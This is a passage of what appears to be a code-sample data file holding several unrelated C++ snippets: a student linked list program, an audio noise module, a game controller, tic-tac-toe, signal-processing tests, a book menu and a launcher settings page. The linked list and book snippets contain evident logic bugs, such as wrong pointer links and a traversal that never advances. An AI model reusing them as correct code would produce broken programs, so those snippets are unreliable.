dc)\n\t{\n\t\tif ((",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct Node\n{\n    int noMhs;\n    string name;\n    Node* next;\n    Node* prev;\n};\n\nNode* START = NULL;\n\nvoid addNode(){\n    Node* newNode = new Node(); // step 1 : create a new node\n    cout << \"\\nEnter the roll number of the student : \";\n    cin >> newNode->noMhs;      // assign value to the data field of the new node\n    cout << \"\\nEnter the name of the student : \";\n    cin >> newNode->name;      // assign value to the data field of the new node\n\n    // Insert the nw node in the list\n    if (START != NULL && newNode->noMhs == START->noMhs) {\n\n        if (START != NULL && newNode->noMhs == START->noMhs){\n            cout << \"\\033[31mDuplicate roll not allowed\\033]0m\" << endl;\n            return;\n        }\n        // if the list empty, make the new node the START\n        newNode->next = START; // step 3 : make the new node point to the first node\n        if (START != NULL) {\n            START->prev = newNode; // step 4 : make the first node point to the new node\n        }\n        newNode->prev = NULL; // step 5 : make the new node point to NULL\n        START = newNode; // step 6 : make the new node the first node\n    }\n    else{\n        // insert the new node in the middle or at the end\n        Node *current = START; // step 1.a : start from the first node\n        Node *previous = NULL; // step 1.b : previous node is NULL initially\n\n        while (current != NULL && current->noMhs < newNode->noMhs) // step 1.c traverse the list to find the correct position\n        {\n            previous = current; // step 1.d : move the previous to the current node\n            current = current->next; // step 1.e : move the currrent to the next node\n        }\n\n        newNode->next = previous; // step 4 : make the next field of the new node point to current\n        newNode->prev = previous; // step 5 : make the previous field of the new node point to previous\n\n        if (current != NULL)\n        {\n            current->prev = newNode; // step 6 : make the next previous field of the current node point ti the new world\n        }\n\n        if (previous != NULL)\n        {\n            previous->next =newNode; // step 7 : make the next field of the previous node point to the new node\n        }\n        else\n        {\n            // if previous is still NULL, it means newNode is now the first node\n            START = newNode;\n        }\n    }\n    \n}\n\nbool search(int rollNo, Node **previous, Node **current)\n{\n    *previous = NULL;\n    *current = START;\n    while (*current != NULL && (*current)->noMhs != rollNo)\n    {\n        *previous = * current;\n        *current = (*current)->next;\n    }\n    return (*current != NULL);\n}\n\nvoid deleteNode()\n{\n    Node *previous, *current;\n    int rollNo;\n\n    cout <<\"\\nEnter the roll number of the student whose record is to be deleted : \";\n    cin >> rollNo; // step 3 : get the roll number to be deleted\n\n    if (START == NULL)\n    {\n        cout << \"List is empty\" << endl;\n        return;\n    }\n\n    current = START; // step 1 : start from the first node\n    previous = NULL;\n\n    // Locate the node to be deleted\n    while (current != NULL && current->noMhs != rollNo)\n    {\n        cout << \"\\033[31mThe record wtih toll number \" << rollNo << \" not found\\033[0m\" << endl;\n        return;\n    }\n\n    // Node to be deleted is the first node\n    if (current == START)\n    {\n        START = START->next; // step 2 : update the START pointer\n        if (START != NULL)\n        {\n           START->prev = NULL; \n        }\n    }\n    else\n    { // Node to be deletd is not the first node\n        previous->next = current->next;\n        if (current->next != NULL)\n        { // if there's a succesor, update is prev pointer\n            current->next->prev = previous;\n        } \n    }\n\n    // release the memory of the node marked as current\n    delete current;\n    cout << \"\\x1b[32mRecord with roll number \" << rollNo << \" deleted\\x1b[0m\" << endl;\n}\n\nbool listEmpty()\n{\n    return (START == NULL);\n}\n\nvoid traverse()\n{\n    if (listEmpty())\n        cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecords in ascending order of roll number are : \" << endl;\n        Node *currentNode = START; // step 1\n        while (currentNode != NULL) // step 2\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl; // step 3\n        }\n    }\n}\n\nvoid revtravese()\n{\n    if (listEmpty())\n    cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecords in descending order of roll number are : \" << endl;\n        Node *currentNode = START;\n        while (currentNode->next != NULL)\n            currentNode = currentNode->next;\n\n        while (currentNode != NULL)\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl;\n            currentNode = currentNode->prev;\n        }\n        \n    }\n    \n}\nvoid searchData(){\n    if (listEmpty() == true)\n    {\n        cout << \"\\nList is empty\" << endl;\n    }\n    Node ",
    "#include \"plugin.hpp\"\n#include \"sanguinecomponents.hpp\"\n\n/** Based on \"The Voss algorithm\"\nhttp://www.firstpr.com.au/dsp/pink-noise/\n*/\ntemplate <int QUALITY = 8>\nstruct PinkNoiseGenerator {\n\tint frame = -1;\n\tfloat values[QUALITY] = {};\n\n\tfloat process() {\n\t\tint lastFrame = frame;\n\t\tframe++;\n\t\tif (frame >= (1 << QUALITY))\n\t\t\tframe = 0;\n\t\tint diff = lastFrame ^ frame;\n\n\t\tfloat sum = 0.f;\n\t\tfor (int i = 0; i < QUALITY; i++) {\n\t\t\tif (diff & (1 << i)) {\n\t\t\t\tvalues[i] = random::uniform() - 0.5f;\n\t\t\t}\n\t\t\tsum += values[i];\n\t\t}\n\t\treturn sum;\n\t}\n};\n\n\nstruct InverseAWeightingFFTFilter {\n\tstatic constexpr int BUFFER_LEN = 1024;\n\n\talignas(16) float inputBuffer[BUFFER_LEN] = {};\n\talignas(16) float outputBuffer[BUFFER_LEN] = {};\n\tint frame = 0;\n\tdsp::RealFFT fft;\n\n\tInverseAWeightingFFTFilter() : fft(BUFFER_LEN) {}\n\n\tfloat process(float deltaTime, float x) {\n\t\tinputBuffer[frame] = x;\n\t\tif (++frame >= BUFFER_LEN) {\n\t\t\tframe = 0;\n\t\t\talignas(16) float freqBuffer[BUFFER_LEN * 2];\n\t\t\tfft.rfft(inputBuffer, freqBuffer);\n\n\t\t\tfor (int i = 0; i < BUFFER_LEN; i++) {\n\t\t\t\tfloat f = 1 / deltaTime / 2 / BUFFER_LEN * i;\n\t\t\t\tfloat amp = 0.f;\n\t\t\t\tif (80.f <= f && f <= 20000.f) {\n\t\t\t\t\tfloat f2 = f * f;\n\t\t\t\t\t// Inverse A-weighted curve\n\t\t\t\t\tamp = ((424.36f + f2) * std::sqrt((11599.3f + f2) * (544496.f + f2)) * (148693636.f + f2)) / (148693636.f * f2 * f2);\n\t\t\t\t}\n\t\t\t\tfreqBuffer[2 * i + 0] *= amp / BUFFER_LEN;\n\t\t\t\tfreqBuffer[2 * i + 1] *= amp / BUFFER_LEN;\n\t\t\t}\n\n\t\t\tfft.irfft(freqBuffer, outputBuffer);\n\t\t}\n\t\treturn outputBuffer[frame];\n\t}\n};\n\nstatic const unsigned char perm[512] = { 151,160,137,91,90,15,\n  131,13,201,95,96,53,194,233,7,225,140,36,103,30,69,142,8,99,37,240,21,10,23,\n  190, 6,148,247,120,234,75,0,26,197,62,94,252,219,203,117,35,11,32,57,177,33,\n  88,237,149,56,87,174,20,125,136,171,168, 68,175,74,165,71,134,139,48,27,166,\n  77,146,158,231,83,111,229,122,60,211,133,230,220,105,92,41,55,46,245,40,244,\n  102,143,54, 65,25,63,161, 1,216,80,73,209,76,132,187,208, 89,18,169,200,196,\n  135,130,116,188,159,86,164,100,109,198,173,186, 3,64,52,217,226,250,124,123,\n  5,202,38,147,118,126,255,82,85,212,207,206,59,227,47,16,58,17,182,189,28,42,\n  223,183,170,213,119,248,152, 2,44,154,163, 70,221,153,101,155,167, 43,172,9,\n  129,22,39,253, 19,98,108,110,79,113,224,232,178,185, 112,104,218,246,97,228,\n  251,34,242,193,238,210,144,12,191,179,162,241, 81,51,145,235,249,14,239,107,\n  49,192,214, 31,181,199,106,157,184, 84,204,176,115,121,50,45,127, 4,150,254,\n  138,236,205,93,222,114,67,29,24,72,243,141,128,195,78,66,215,61,156,180,\n  151,160,137,91,90,15,\n  131,13,201,95,96,53,194,233,7,225,140,36,103,30,69,142,8,99,37,240,21,10,23,\n  190, 6,148,247,120,234,75,0,26,197,62,94,252,219,203,117,35,11,32,57,177,33,\n  88,237,149,56,87,174,20,125,136,171,168, 68,175,74,165,71,134,139,48,27,166,\n  77,146,158,231,83,111,229,122,60,211,133,230,220,105,92,41,55,46,245,40,244,\n  102,143,54, 65,25,63,161, 1,216,80,73,209,76,132,187,208, 89,18,169,200,196,\n  135,130,116,188,159,86,164,100,109,198,173,186, 3,64,52,217,226,250,124,123,\n  5,202,38,147,118,126,255,82,85,212,207,206,59,227,47,16,58,17,182,189,28,42,\n  223,183,170,213,119,248,152, 2,44,154,163, 70,221,153,101,155,167, 43,172,9,\n  129,22,39,253, 19,98,108,110,79,113,224,232,178,185, 112,104,218,246,97,228,\n  251,34,242,193,238,210,144,12,191,179,162,241, 81,51,145,235,249,14,239,107,\n  49,192,214, 31,181,199,106,157,184, 84,204,176,115,121,50,45,127, 4,150,254,\n  138,236,205,93,222,114,67,29,24,72,243,141,128,195,78,66,215,61,156,180\n};\n\n#define FASTFLOOR(x) ( ((x)>0) ? ((int)x) : (((int)x)-1) )\n\nstruct Bukavac : Module {\n\n\tenum ParamIds {\n\t\tPARAM_PERLIN_SPEED,\n\t\tPARAM_PERLIN_SPEED_CV,\n\t\tPARAM_PERLIN_AMP,\n\t\tPARAM_PERLIN_AMP_CV,\n\t\tPARAM_PERLIN_WEIGHT0,\n\t\tPARAM_PERLIN_WEIGHT1,\n\t\tPARAM_PERLIN_WEIGHT2,\n\t\tPARAM_PERLIN_WEIGHT3,\n\t\tPARAMS_COUNT\n\t};\n\n\tenum InputIds {\n\t\tINPUT_PERLIN_SPEED,\n\t\tINPUT_PERLIN_AMP,\n\t\tINPUTS_COUNT\n\t};\n\n\tenum OutputIds {\n\t\tOUTPUT_PERLIN_NOISE_MIX,\n\t\tOUTPUT_PERLIN_NOISE0,\n\t\tOUTPUT_PERLIN_NOISE1,\n\t\tOUTPUT_PERLIN_NOISE2,\n\t\tOUTPUT_PERLIN_NOISE3,\n\t\tOUTPUT_WHITE,\n\t\tOUTPUT_PINK,\n\t\tOUTPUT_RED,\n\t\tOUTPUT_VIOLET,\n\t\tOUTPUT_BLUE,\n\t\tOUTPUT_GRAY,\n\t\tOUTPUT_PRISM,\n\t\tOUTPUTS_COUNT\n\t};\n\n\tenum LightIds {\n\t\tLIGHTS_COUNT\n\t};\n\n\tPinkNoiseGenerator<8> pinkNoiseGenerator;\n\tdsp::IIRFilter<2, 2> redFilter;\n\tfloat lastWhite = 0.f;\n\tfloat lastPink = 0.f;\n\tInverseAWeightingFFTFilter grayFilter;\n\n\tconst int kPerlinOctaves = 4;\n\tfloat currentPerlinTime = 0.0;\n\tfloat minSpd = 1;\n\tfloat maxSpd = 500;\n\tfloat oldSpeedVal;\n\tfloat oldSpeedPctVal;\n\tfloat noiseOutMix;\n\tfloat* noise;\n\tconst float maxTime = 511; //FLT_MAX-1000; <-- this needs some more love\n\n\tBukavac() {\n\t\tconfig(PARAMS_COUNT, INPUTS_COUNT, OUTPUTS_COUNT, LIGHTS_COUNT);\n\t\tconfigOutput(OUTPUT_WHITE, \"White noise\");\n\t\toutputInfos[OUTPUT_WHITE]->description = \"0 dB/octave power density\";\n\t\tconfigOutput(OUTPUT_PINK, \"Pink noise\");\n\t\toutputInfos[OUTPUT_PINK]->description = \"-3 dB/octave power density\";\n\t\tconfigOutput(OUTPUT_RED, \"Red noise\");\n\t\toutputInfos[OUTPUT_R",
    "// MIT License - Copyright (c) 2024 Valenthia Chronicles\n\n#include \"VC_PlayerController.h\"\n#include \"Engine/LocalPlayer.h\"\n#include \"EnhancedInputComponent.h\"\n#include \"EnhancedInputSubsystems.h\"\n#include \"GameFramework/Character.h\"\n#include \"InputActionValue.h\"\n\n\nAVC_PlayerController::AVC_PlayerController()\n{\n\tbShowMouseCursor = true;\n\tDefaultMouseCursor = EMouseCursor::Default;\n\tbEnableClickEvents = true;\n}\n\nvoid AVC_PlayerController::BeginPlay()\n{\n\tSuper::BeginPlay();\n\n\t// Recover Input Mapping Context\n\tif (UEnhancedInputLocalPlayerSubsystem* Subsystem = ULocalPlayer::GetSubsystem<UEnhancedInputLocalPlayerSubsystem>(GetLocalPlayer()))\n\t{\n\t\tSubsystem->AddMappingContext(DefaultMappingContext, 0);\n\t}\n}\n\nvoid AVC_PlayerController::SetupInputComponent()\n{\n\tSuper::SetupInputComponent();\n\n\t// Bind each input action to a function\n\tif(UEnhancedInputComponent* EnhancedInputComponent = Cast<UEnhancedInputComponent>(InputComponent))\n\t{\n\t\t// Jumping\n\t\tEnhancedInputComponent->BindAction(JumpAction, ETriggerEvent::Started, this, &AVC_PlayerController::Jump);\n\t\tEnhancedInputComponent->BindAction(JumpAction, ETriggerEvent::Completed, this, &AVC_PlayerController::Jump);\n\n\t\t// Moving\n\t\tEnhancedInputComponent->BindAction(MoveAction, ETriggerEvent::Triggered, this, &AVC_PlayerController::Move);\n\t} \n}\n\n\nvoid AVC_PlayerController::Move(const FInputActionValue& Value)\n{\n\tif (GetCharacter() != nullptr)\n\t{\n\t\tconst FVector2D MovementVector = Value.Get<FVector2D>();\n\t\t\n\t\t// Find out which way is forward\n\t\tconst FRotator Rotation = GetCharacter()->GetControlRotation();\n\t\tconst FRotator YawRotation(0, Rotation.Yaw, 0);\n\n\t\t// Get forward vector\n\t\tconst FVector ForwardDirection = FRotationMatrix(YawRotation).GetUnitAxis(EAxis::X);\n\t\tconst FVector RightDirection = FRotationMatrix(YawRotation).GetUnitAxis(EAxis::Y);\n\n\t\t// Add movement direction\n\t\tGetCharacter()->AddMovementInput(ForwardDirection, MovementVector.Y);\n\t\tGetCharacter()->AddMovementInput(RightDirection, MovementVector.X);\n\t}\n}\n\nvoid AVC_PlayerController::Jump(const FInputActionValue& Value)\n{\n\tif (GetCharacter() != nullptr)\n\t{\n\t\tGetCharacter()->Jump();\n\t}\n}\n\n\n",
    "\ufeff#include <vector>\r\n#include <iostream>\r\n#include <SFML/Graphics.hpp>\r\n\r\n#define BLANK 0\r\n#define CROSS 1\r\n#define ZERO 2\r\n\r\n#define CROSS_WON 10\r\n#define ZERO_WON 11\r\n#define TIE 12\r\n#define GAME_NOT_OVER 13\r\n\r\nusing namespace sf;\r\nusing namespace std;\r\n\r\nint game_situation(const vector<int>& board)\r\n{\r\n    if (board[0] == CROSS && board[1] == CROSS && board[2] == CROSS ||\r\n        board[3] == CROSS && board[4] == CROSS && board[5] == CROSS ||\r\n        board[6] == CROSS && board[7] == CROSS && board[8] == CROSS ||\r\n        board[0] == CROSS && board[3] == CROSS && board[6] == CROSS ||\r\n        board[1] == CROSS && board[4] == CROSS && board[7] == CROSS ||\r\n        board[2] == CROSS && board[5] == CROSS && board[8] == CROSS ||\r\n        board[0] == CROSS && board[4] == CROSS && board[8] == CROSS ||\r\n        board[2] == CROSS && board[4] == CROSS && board[6] == CROSS)\r\n        return CROSS_WON;\r\n    if (board[0] == ZERO && board[1] == ZERO && board[2] == ZERO ||\r\n        board[3] == ZERO && board[4] == ZERO && board[5] == ZERO ||\r\n        board[6] == ZERO && board[7] == ZERO && board[8] == ZERO ||\r\n        board[0] == ZERO && board[3] == ZERO && board[6] == ZERO ||\r\n        board[1] == ZERO && board[4] == ZERO && board[7] == ZERO ||\r\n        board[2] == ZERO && board[5] == ZERO && board[8] == ZERO ||\r\n        board[0] == ZERO && board[4] == ZERO && board[8] == ZERO ||\r\n        board[2] == ZERO && board[4] == ZERO && board[6] == ZERO)\r\n        return ZERO_WON;\r\n    for (auto i : board)\r\n    {\r\n        if (i == BLANK) return GAME_NOT_OVER;\r\n    }\r\n    return TIE;\r\n}\r\n\r\nint minimax(vector<int>& board, int alpha, int beta, bool is_zero) \r\n{\r\n    int gs = game_situation(board);\r\n    if (gs == CROSS_WON) return 1000;\r\n    if (gs == ZERO_WON) return -1000;\r\n    if (gs == TIE) return 0;\r\n\r\n    if (is_zero)\r\n    {\r\n        int min_score = 1e9;\r\n        for (int i = 0; i < 9; i++)\r\n        {\r\n            if (board[i] != BLANK) continue;\r\n            vector<int> tmp = board;\r\n            tmp[i] = ZERO;\r\n            int cur_score = minimax(tmp, alpha, beta, false);\r\n            min_score = min(min_score, cur_score);\r\n            beta = min(beta, cur_score);\r\n            if (beta <= alpha) break;\r\n        }\r\n        return min_score;\r\n    }\r\n    else\r\n    {\r\n        int max_score = -1e9;\r\n        for (int i = 0; i < 9; i++)\r\n        {\r\n            if (board[i] != BLANK) continue;\r\n            vector<int> tmp = board;\r\n            tmp[i] = CROSS;\r\n            int cur_score = minimax(tmp, alpha, beta, true);\r\n            max_score = max(max_score, cur_score);\r\n            alpha = max(alpha, cur_score);\r\n            if (beta <= alpha) break;\r\n        }\r\n        return max_score;\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    RenderWindow window(sf::VideoMode(850, 850), \"Tic Tac Toe\");\r\n    \r\n    Texture field_tex;\r\n    field_tex.loadFromFile(\"../image/field.png\");\r\n    Sprite field_spr;\r\n    field_spr.setTexture(field_tex);\r\n    \r\n    Texture cross_tex;\r\n    cross_tex.loadFromFile(\"../image/cross.png\");\r\n\r\n    Texture zero_tex;\r\n    zero_tex.loadFromFile(\"../image/zero.png\");\r\n\r\n    vector<int> board(9, BLANK);\r\n    int cnt = 0;\r\n    bool game_over = false;\r\n\r\n    while (window.isOpen())\r\n    {\r\n        int gs = game_situation(board);\r\n        if (gs != GAME_NOT_OVER && !game_over)\r\n        {\r\n            switch (gs)\r\n            {\n            case CROSS_WON: cout << \"CROSS WON\" << endl; break;\r\n            case ZERO_WON: cout << \"ZERO WON\" << endl; break;\r\n            case TIE: cout << \"TIE\" << endl; break;\r\n            }\r\n            game_over = true;\r\n        }\r\n        \r\n        if (cnt % 2 == 1)\r\n        {\r\n            int best_move, min_eval = 1e9;\r\n            for (int i = 0; i < 9; i++)\r\n            {\r\n                if (board[i] == BLANK)\r\n                {\r\n                    vector<int> tmp = board;\r\n                    tmp[i] = ZERO;\r\n                    int cur = minimax(tmp, -1e9, 1e9, false);\r\n                    if (cur < min_eval)\r\n                    {\r\n                        min_eval = cur;\r\n                        best_move = i;\r\n                    }\r\n                }\r\n            }\r\n            board[best_move] = ZERO;\r\n            cnt++;\r\n        }\r\n\r\n        sf::Event event;\r\n        while (window.pollEvent(event))\r\n        {\r\n            switch (event.type)\r\n            {\r\n            case Event::Closed: window.close(); break;\r\n            case Event::KeyPressed:\r\n                if (event.key.code == Keyboard::R)\r\n                {\r\n                    board = vector<int>(9, BLANK);\r\n                    cnt = 0; game_over = false;\r\n                    system(\"cls\");\r\n                }\r\n                break;\r\n            case Event::MouseButtonPressed:\r\n                if (cnt % 2 == 0)\r\n                {\r\n                    if (game_over) continue;\r\n                    Vector2f ev = Vector2f(event.mouseButton.x < 825 ? event.mouseButton.x : 825,\r\n                        event.mouseButton.y < 825 ? event.mous",
    "#include <gnuradio-4.0/Graph.hpp>\n#include <gnuradio-4.0/Scheduler.hpp>\n#include <gnuradio-4.0/packet-modem/head.hpp>\n#include <gnuradio-4.0/packet-modem/random_source.hpp>\n#include <gnuradio-4.0/packet-modem/vector_sink.hpp>\n#include <gnuradio-4.0/packet-modem/vector_source.hpp>\n#include <boost/ut.hpp>\n#include <ranges>\n\nboost::ut::suite VectorSourceAndSinkTests = [] {\n    using namespace boost::ut;\n    using namespace gr;\n    using namespace gr::packet_modem;\n\n    \"vector_source_fixed_data\"_test = [] {\n        Graph fg;\n        std::vector<int> v(100);\n        std::iota(v.begin(), v.end(), 0);\n        const std::vector<Tag> tags = {\n            { 0, { { \"a\", pmtv::pmt_null() } } },\n            { 10, { { \"b\", 0.1234 }, { \"c\", 12345U } } },\n            { 73, { { \"d\", std::vector<int>{ 1, 2, 3 } }, { \"e\", 0.0f } } },\n            { std::ssize(v) - 1, { { \"f\", pmtv::pmt_null() } } }\n        };\n        auto& source = fg.emplaceBlock<VectorSource<int>>();\n        source.data = v;\n        source.tags = tags;\n        auto& sink = fg.emplaceBlock<VectorSink<int>>();\n        expect(eq(ConnectionResult::SUCCESS, fg.connect<\"out\">(source).to<\"in\">(sink)));\n        scheduler::Simple sched{ std::move(fg) };\n        expect(sched.runAndWait().has_value());\n        expect(eq(sink.data(), v));\n        // do not use eq(), because tags cannot be formatted\n        expect(sink.tags() == tags);\n    };\n\n    \"vector_source_long_vector\"_test = [] {\n        Graph fg;\n        constexpr auto num_items = 1000000_ul;\n        std::vector<int> v(static_cast<size_t>(num_items));\n        std::iota(v.begin(), v.end(), 0);\n        auto& source = fg.emplaceBlock<VectorSource<int>>();\n        source.data = v;\n        auto& sink = fg.emplaceBlock<VectorSink<int>>();\n        expect(eq(ConnectionResult::SUCCESS, fg.connect<\"out\">(source).to<\"in\">(sink)));\n        scheduler::Simple sched{ std::move(fg) };\n        expect(sched.runAndWait().has_value());\n        expect(eq(sink.data(), v));\n    };\n\n    \"vector_source_repeat\"_test = [] {\n        Graph fg;\n        constexpr auto num_items = 100_ul;\n        std::vector<int> v(static_cast<size_t>(num_items));\n        std::iota(v.begin(), v.end(), 0);\n        const std::vector<Tag> tags = { { 0, { { \"begin\", pmtv::pmt_null() } } },\n                                        { std::ssize(v) - 1,\n                                          { { \"end\", pmtv::pmt_null() } } } };\n        const uint64_t repetitions = 1000;\n        auto& source = fg.emplaceBlock<VectorSource<int>>({ { \"repeat\", true } });\n        source.data = v;\n        source.tags = tags;\n        auto& head = fg.emplaceBlock<Head<int>>(\n            { { \"num_items\", static_cast<uint64_t>(num_items) * repetitions } });\n        auto& sink = fg.emplaceBlock<VectorSink<int>>();\n        expect(eq(ConnectionResult::SUCCESS, fg.connect<\"out\">(source).to<\"in\">(head)));\n        expect(eq(ConnectionResult::SUCCESS, fg.connect<\"out\">(head).to<\"in\">(sink)));\n        scheduler::Simple sched{ std::move(fg) };\n        expect(sched.runAndWait().has_value());\n        const auto sink_data = sink.data();\n        for (size_t j = 0; j < repetitions; ++j) {\n            const auto r = sink_data |\n                           std::views::drop(j * static_cast<size_t>(num_items)) |\n                           std::views::take(static_cast<size_t>(num_items));\n            const std::vector<int> rep(r.begin(), r.end());\n            expect(eq(rep, v));\n        }\n        const auto sink_tags = sink.tags();\n        expect(eq(sink_tags.size(), tags.size() * repetitions));\n        for (size_t j = 0; j < repetitions; ++j) {\n            const auto& tag_begin = sink_tags[2 * j];\n            const auto& tag_end = sink_tags[2 * j + 1];\n            expect(eq(tag_begin.index, static_cast<ssize_t>(j * v.size())));\n            expect(eq(tag_end.index, static_cast<ssize_t>((j + 1) * v.size() - 1)));\n            expect(tag_begin.map == tags[0].map);\n            expect(tag_end.map == tags[1].map);\n        }\n    };\n\n    \"random_source\"_test = [] {\n        Graph fg;\n        constexpr auto num_items = 1000000_ul;\n        constexpr auto min = 1872_i;\n        constexpr auto max = 2873_i;\n        auto& source = fg.emplaceBlock<RandomSource<int>>(\n            { { \"minimum\", static_cast<int>(min) },\n              { \"maximum\", static_cast<int>(max) },\n              { \"num_items\", static_cast<size_t>(num_items) },\n              { \"repeat\", false } });\n        auto& sink = fg.emplaceBlock<VectorSink<int>>();\n        expect(eq(ConnectionResult::SUCCESS, fg.connect<\"out\">(source).to<\"in\">(sink)));\n        scheduler::Simple sched{ std::move(fg) };\n        expect(sched.runAndWait().has_value());\n        const auto data = sink.data();\n        expect(eq(data.size(), num_items));\n        for (const auto x : data) {\n            expect(x >= min && x <= max);\n        }\n    };\n};\n\nint main() {}\n",
    "#include \"Book.h\"\nint main()\n{\n\tint NBooks=NULL;\n    FILE* fp = nullptr;\n    Book* books=new Book[1];\n    \n    fopen_s(&fp, \"books.txt\", \"r\"); //\u00e7\u00e0\u00ef\u00ee\u00e2\u00ed\u00e5\u00ed\u00ed\u00ff \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3 \n    if (fp != NULL) \n    {    \n        fread(&NBooks, sizeof(int), 1, fp);\n        delete[] books;\n        books = new Book[NBooks];\n        for(int i =0 ;i<NBooks;i++)\n        {\n            books[i].loadFromBinFile(fp);\n        }\n        fclose(fp);\n    }\n\n\n\tint menu,deleteId,menuSort,menuEdit,editId,menuFind;\n    Book tmp;\n\tdo \n\t{\n        cout << \"--------------------------------\\n\";\n        cout << \"|             MENU             |\\n\";\n        cout << \"|------------------------------|\\n\";\n        cout << \"|1.Show all books in library   |\\n\";\n        cout << \"|2.Add new book                |\\n\";\n        cout << \"|3.Remove book                 |\\n\";\n        cout << \"|4.Show sorted books           |\\n\";\n        cout << \"|5.Edit info in book           |\\n\";\n        cout << \"|6.Search book                 |\\n\";\n        cout << \"|------------------------------|\\n\";\n        cout << \"|0.Exit                        |\\n\";\n        cout << \"--------------------------------\\n\";\n        cout << \" >>> \"; cin >> menu;\n\t\n        switch (menu)\n        {\n        \n        case 1:\n            cout << \"\\n\\n\\n\";\n            for(int i = 0;i<NBooks;i++)\n            {\n                books[i].showBook();\n            }\n            cout << \"\\n\\n\\n\";\n            break;\n        \n        case 2:\n            tmp.addNewBook();\n            if (NBooks==NULL) \n            {\n                cout << \"asd\";\n                books[0] = tmp;\n                NBooks=1;\n            }\n            else\n            {\n                addItemBack(books, NBooks, tmp);\n            }\n            break;\n        \n        case 3:\n            char deleteName[50];\n            cout << \"\\n\\nEnter book name to delete - \";\n            cin.ignore();\n            cin.getline(deleteName,50);\n            cout << endl;\n            deleteId = -1;\n            for (int i = 0; i < NBooks; i++)\n            {\n                if (strcmp(books[i].name, deleteName) == 0) \n                {\n                    deleteId = i;\n                    break;\n                }\n            }\n            if(deleteId!=-1)\n            {\n            removeItem(books, NBooks, deleteId);\n            cout << \"Deleted!\\n\" << endl;\n            }\n            else \n            {\n                cout << \"Not found book with that name!\\n\"<<endl;\n            }\n            break;\n\n        case 4:\n            do {\n                cout << \"\\n\\n\";\n                cout << \"------------------------------------------------------\\n\";\n                cout << \"|                           SORT                     |\\n\";\n                cout << \"------------------------------------------------------\\n\";\n                cout << \"|1.Sort by pages (from max to min)                   |\\n\";\n                cout << \"|2.Sort by develope year (from older to newest)      |\\n\";\n                cout << \"|3.Sort by add to library year (from older to newest)|\\n\";\n                cout << \"|----------------------------------------------------|\\n\";\n                cout << \"|0.Back to main menu                                 |\\n\";\n                cout << \"------------------------------------------------------\\n\";\n                cout << \" >>> \"; cin >> menuSort;\n                cout << \"\\n\\n\";\n                \n                switch (menuSort) \n                {\n                case 1:\n                    showSortedPages(books, NBooks);\n                    break;\n                case 2:\n                    showSortedDateWriten(books, NBooks);\n                    break;\n                case 3:\n                    showSortedDateAdded(books, NBooks);\n                    break;\n                case 0:\n                    break;\n                default:\n                    cout << \"Error command!\"<<endl;\n                    break;\n                }\n            } while (menuSort != 0);\n                break;\n        case 5:\n            char editingBook[50];\n            cout << \"\\nEnter name of book for edit - \";\n            cin.ignore();\n            cin.getline(editingBook, 50);\n            cout << endl;\n            editId = -1;\n            for (int i = 0; i < NBooks; i++)\n            {\n                if (strcmp(books[i].name, editingBook) == 0)\n                {\n                    editId = i;\n                    break;\n                }\n            }\n            if(editId!=-1)\n            {\n                do {\n\n                    cout << \"\\n\\n\";\n                    cout << \"-------------------------------------------------\\n\";\n                    cout << \"|                          EDIT                 |\\n\";\n                    cout << \"-------------------------------------------------\\n\";\n                    cout << \"|1. Edit type of book                           |\\n\";\n                    cout << \"|2. Edit name of book                           |\\n\";\n                    ",
    "// SPDX-License-Identifier: GPL-3.0-only\n/*\n *  Prism Launcher - Minecraft Launcher\n *  Copyright (c) 2022 Jamie Mansfield <jmansfield@cadixdev.org>\n *  Copyright (C) 2022 Sefa Eyeoglu <contact@scrumplex.net>\n *  Copyright (C) 2022 TheKodeToad <TheKodeToad@proton.me>\n *\n *  This program is free software: you can redistribute it and/or modify\n *  it under the terms of the GNU General Public License as published by\n *  the Free Software Foundation, version 3.\n *\n *  This program is distributed in the hope that it will be useful,\n *  but WITHOUT ANY WARRANTY; without even the implied warranty of\n *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n *  GNU General Public License for more details.\n *\n *  You should have received a copy of the GNU General Public License\n *  along with this program.  If not, see <https://www.gnu.org/licenses/>.\n *\n * This file incorporates work covered by the following copyright and\n * permission notice:\n *\n *      Copyright 2013-2021 MultiMC Contributors\n *\n *      Licensed under the Apache License, Version 2.0 (the \"License\");\n *      you may not use this file except in compliance with the License.\n *      You may obtain a copy of the License at\n *\n *          http://www.apache.org/licenses/LICENSE-2.0\n *\n *      Unless required by applicable law or agreed to in writing, software\n *      distributed under the License is distributed on an \"AS IS\" BASIS,\n *      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n *      See the License for the specific language governing permissions and\n *      limitations under the License.\n */\n\n#include \"InstanceSettingsPage.h\"\n#include \"ui_InstanceSettingsPage.h\"\n\n#include <QDialog>\n#include <QFileDialog>\n#include <QMessageBox>\n\n#include <sys.h>\n\n#include \"ui/dialogs/VersionSelectDialog.h\"\n#include \"ui/widgets/CustomCommands.h\"\n\n#include \"Application.h\"\n#include \"BuildConfig.h\"\n#include \"JavaCommon.h\"\n#include \"minecraft/auth/AccountList.h\"\n\n#include \"FileSystem.h\"\n#include \"java/JavaInstallList.h\"\n#include \"java/JavaUtils.h\"\n\nInstanceSettingsPage::InstanceSettingsPage(BaseInstance* inst, QWidget* parent)\n    : QWidget(parent), ui(new Ui::InstanceSettingsPage), m_instance(inst)\n{\n    m_settings = inst->settings();\n    ui->setupUi(this);\n\n    connect(ui->openGlobalJavaSettingsButton, &QCommandLinkButton::clicked, this, &InstanceSettingsPage::globalSettingsButtonClicked);\n    connect(APPLICATION, &Application::globalSettingsAboutToOpen, this, &InstanceSettingsPage::applySettings);\n    connect(APPLICATION, &Application::globalSettingsClosed, this, &InstanceSettingsPage::loadSettings);\n    connect(ui->instanceAccountSelector, QOverload<int>::of(&QComboBox::currentIndexChanged), this,\n            &InstanceSettingsPage::changeInstanceAccount);\n\n    connect(ui->useNativeGLFWCheck, &QAbstractButton::toggled, this, &InstanceSettingsPage::onUseNativeGLFWChanged);\n    connect(ui->useNativeOpenALCheck, &QAbstractButton::toggled, this, &InstanceSettingsPage::onUseNativeOpenALChanged);\n\n    loadSettings();\n\n    